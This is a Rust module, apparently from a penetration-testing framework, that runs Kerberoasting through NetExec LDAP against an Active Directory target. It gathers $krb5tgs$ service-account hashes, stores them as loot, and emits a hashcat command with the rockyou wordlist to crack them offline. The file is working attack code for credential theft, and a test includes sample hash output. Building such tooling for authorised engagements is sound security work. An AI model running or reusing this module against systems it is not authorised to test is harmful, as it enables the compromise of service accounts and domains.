//! Kerberoasting via NetExec LDAP (`--kerberoasting`). Collects `$krb5tgs$` hashes
//! for accounts with SPNs, saves them to loot, and raises a finding with the exact
//! hashcat command to crack them offline.

use std::sync::Arc;

use serde_json::json;

use crate::db::repository;
use crate::models::{Finding, Job};
use crate::state::AppState;

use super::nxc_common::{
    active_engagement_id, record_fact, record_finding, require_nxc, run_nxc, save_loot,
};

pub struct AdKerberoast;

impl AdKerberoast {
    pub async fn run(job: &Job, state: &Arc<AppState>) -> Result<String, String> {
        let cfg = job.config.as_object().ok_or("Invalid job config")?;
        let target = job.target()?;
        let user = cfg.get("username").and_then(|v| v.as_str()).ok_or("config.username required")?;
        let pass = cfg.get("password").and_then(|v| v.as_str()).ok_or("config.password required")?;
        let domain = cfg.get("domain").and_then(|v| v.as_str()).unwrap_or("");
        let bin = require_nxc(state, &job.id, "ad-kerberoast").await?;

        let outfile = std::env::temp_dir().join(format!("decebalus_kroast_{}.txt", job.id));
        let mut args = vec![
            "ldap".to_string(),
            target.clone(),
            "-u".to_string(),
            user.to_string(),
            "-p".to_string(),
            pass.to_string(),
            "--kerberoasting".to_string(),
            outfile.to_string_lossy().to_string(),
        ];
        if !domain.is_empty() {
            args.push("-d".to_string());
            args.push(domain.to_string());
        }

        let _ = state.broadcaster.send(format!("scan_progress:{}:Kerberoasting on {}", job.id, target));
        let out = run_nxc(bin, &args, 300).await?;
        let file_text = tokio::fs::read_to_string(&outfile).await.unwrap_or_default();
        let _ = tokio::fs::remove_file(&outfile).await;

        let combined = format!("{}\n{}", out.stdout, file_text);
        let hashes = parse_hashes(&combined, "$krb5tgs$");

        let eng = active_engagement_id(state).await;
        record_fact(state, &eng, &job.id, "host", &target, "roastable_spns", json!(hashes.len())).await;

        let mut loot_path = String::new();
        if !hashes.is_empty() {
            loot_path = save_loot(&target, "kerberoast.txt", hashes.join("\n").as_bytes())
                .await
                .unwrap_or_default();

            let mut f = Finding::new(
                format!("kerberoast:{}", target),
                format!("{} Kerberoastable account(s) on {}", hashes.len(), target),
            );
            f.engagement_id = eng.clone();
            f.category = "ad".into();
            f.severity = "high".into();
            f.value_score = 75;
            f.rationale = "SPN accounts allow offline TGS cracking; weak service passwords lead to compromise.".into();
            f.suggested_command = Some(format!("hashcat -m 13100 {} /usr/share/wordlists/rockyou.txt --force", loot_path));
            f.status = "done".into();
            f.evidence = json!({ "target": target, "hashes": hashes.len(), "loot": loot_path });
            record_finding(state, &f).await;
        }

        let msg = format!("Kerberoast on {}: {} hash(es)", target, hashes.len());
        let _ = repository::add_log(&state.db, "INFO", "attacks", Some("ad-kerberoast"), Some(&job.id), &msg).await;
        let _ = state.broadcaster.send(format!("scan_progress:{}:{}", job.id, msg));

        Ok(json!({ "target": target, "hashes": hashes.len(), "loot": loot_path }).to_string())
    }
}

/// Collect hash strings beginning with `prefix` from mixed tool output.
pub fn parse_hashes(text: &str, prefix: &str) -> Vec<String> {
    let mut out = Vec::new();
    for line in text.lines() {
        if let Some(idx) = line.find(prefix) {
            let hash = line[idx..].trim().to_string();
            if !out.contains(&hash) {
                out.push(hash);
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_krb5tgs_hashes() {
        let text = "\
LDAP 10.0.0.5 389 DC01 [+] acme\\svc:pass
LDAP 10.0.0.5 389 DC01 $krb5tgs$23$*svc_web$ACME.LOCAL$http/web*$abc...def
noise
LDAP 10.0.0.5 389 DC01 $krb5tgs$23$*svc_sql$ACME.LOCAL$mssql*$111...222";
        let hashes = parse_hashes(text, "$krb5tgs$");
        assert_eq!(hashes.len(), 2);
        assert!(hashes[0].starts_with("$krb5tgs$23$*svc_web"));
    }
}
